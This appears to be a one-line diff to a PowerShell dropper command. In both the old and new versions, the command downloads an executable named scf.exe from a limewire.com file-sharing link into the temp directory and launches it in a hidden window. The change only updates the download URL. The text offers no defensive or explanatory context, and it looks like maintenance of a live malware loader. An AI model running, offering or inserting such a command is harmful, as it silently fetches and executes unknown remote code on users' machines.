@@ -1,1 +1,1 @@
-$f=[IO.Path]::GetTempPath()+'scf.exe';irm 'https://limewire.com/d/bBAYv#3y7TujiSK7' -OutFile $f;saps $f -WindowStyle Hidden
+$f=[IO.Path]::GetTempPath()+'scf.exe';irm 'https://limewire.com/decrypt/download?downloadId=988954fc-0f92-471d-a18b-5eee18e2d26d' -OutFile $f;saps $f -WindowStyle Hidden
